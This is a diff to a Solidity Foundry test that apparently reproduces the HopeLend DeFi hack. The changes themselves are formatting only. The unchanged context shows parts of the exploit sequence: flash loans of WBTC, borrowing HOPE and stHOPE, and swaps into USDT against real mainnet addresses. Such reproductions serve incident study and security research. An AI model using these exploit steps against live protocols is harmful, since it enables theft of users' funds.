@@ -15,6 +15,7 @@ import "./../interface.sol";
 // https://lunaray.medium.com/deep-dive-into-hopelend-hack-5962e8b55d3f
 
 interface IHopeLendPool {
+
     function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
 
     function flashLoan(
@@ -36,9 +37,11 @@ interface IHopeLendPool {
         uint16 referralCode,
         address onBehalfOf
     ) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 private WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
     IERC20 private WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 private USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
@@ -93,7 +96,7 @@ contract ContractTest is Test {
         assets[0] = address(WBTC);
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = 2300 * 1e8;
-        uint256[] memory modes = new uint[](1);
+        uint256[] memory modes = new uint256[](1);
         modes[0] = 0;
 
         AaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
@@ -130,7 +133,7 @@ contract ContractTest is Test {
                 assets[0] = address(WBTC);
                 uint256[] memory amounts = new uint256[](1);
                 amounts[0] = 2000 * 1e8;
-                uint256[] memory modes = new uint[](1);
+                uint256[] memory modes = new uint256[](1);
                 modes[0] = 0x0;
 
                 HopeLend.flashLoan(address(this), assets, amounts, modes, address(this), "", 0x0);
@@ -147,11 +150,11 @@ contract ContractTest is Test {
             HopeLend.borrow(address(HOPE), HOPEBalance, 2, 0, address(this));
             HopeLend.borrow(address(stHOPE), stHOPEBalance, 2, 0, address(this));
 
-            address[] memory path = new address [](2);
+            address[] memory path = new address[](2);
             (path[0], path[1]) = (address(stHOPE), address(HOPE));
             UniRouter02.swapExactTokensForTokens(stHOPEBalance, 0, path, address(this), type(uint256).max);
 
-            address[] memory path1 = new address [](2);
+            address[] memory path1 = new address[](2);
             (path1[0], path1[1]) = (address(HOPE), address(USDT));
             UniRouter02.swapExactTokensForTokens(
                 HOPE.balanceOf(address(this)), 0, path1, address(this), block.timestamp + 10_000
@@ -236,4 +239,5 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
+
 }
